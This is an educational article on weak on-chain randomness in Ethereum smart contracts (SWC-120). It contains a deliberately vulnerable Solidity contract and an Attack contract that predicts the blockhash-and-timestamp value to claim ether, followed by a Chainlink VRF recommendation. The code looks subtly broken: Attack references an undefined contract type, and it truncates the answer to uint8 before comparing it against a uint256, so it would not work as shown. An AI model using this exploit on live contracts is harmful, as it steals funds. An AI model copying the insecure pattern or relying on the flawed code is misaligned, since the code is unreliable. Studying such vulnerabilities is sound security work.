## Weak Sources of Randomness from Chain Attributes

Using chain attributes for randomness, e.g.: `block.timestamp`, `blockhash`, and `block.difficulty` can seem like a good idea since they often produce pseudo-random values. The problem, however, is that Ethereum is entirely deterministic and all available on-chain data is public. Chain attributes can either be predicted or manipulated, and should thus never be used for random number generation.

### Example of Weak Randomness

```solidity
pragma solidity ^0.8.24;

contract GuessTheRandomNumber {
    constructor() payable {}

    function guess(uint256 _guess) public {
        uint256 answer = uint256(
            keccak256(
                abi.encodePacked(blockhash(block.number - 1), block.timestamp)
            )
        );

        if (_guess == answer) {
            (bool sent,) = msg.sender.call{value: 1 ether}("");
            require(sent, "Failed to send Ether");
        }
    }
}
```
In the above example, the answer variable is initialized using `blockhash(block.number - 1)` and `block.timestamp`. This method is insecure because both `blockhash` and `block.timestamp` can be retrieved directly by another contract just in time, making it possible to guess the answer and win the challenge unfairly.

An attacker can exploit the weak randomness as follows:

```solidity
contract Attack {
    receive() external payable {}

    function attack(GuessTheRandomNumberChallenge guessTheRandomNumber) public {
        uint256 answer = uint256(
            keccak256(
                abi.encodePacked(blockhash(block.number - 1), block.timestamp)
            )
        );

        guessTheRandomNumber.guess(uint8(answer));
    }

    // Helper function to check balance
    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}
```
The `Attack` contract calculates the `answer` using the same logic as the `GuessTheRandomNumber` contract and guesses it correctly, allowing the attacker to win the challenge.

### Preventive Measures

A common and more secure solution is to use an oracle service such as [Chainlink VRF](https://docs.chain.link/vrf/v2/introduction/), which provides verifiable randomness that cannot be manipulated.

### Sources

- [SWC Registry: SWC-120](https://swcregistry.io/docs/SWC-120)
- [When can blockhash be safely used for a random number? When would it be unsafe?](https://ethereum.stackexchange.com/questions/419/when-can-blockhash-be-safely-used-for-a-random-number-when-would-it-be-unsafe)
- [How can I securely generate a random number in my smart contract?](https://ethereum.stackexchange.com/questions/191/how-can-i-securely-generate-a-random-number-in-my-smart-contract)
- [Solidity Patterns: Randomness](https://fravoll.github.io/solidity-patterns/randomness.html)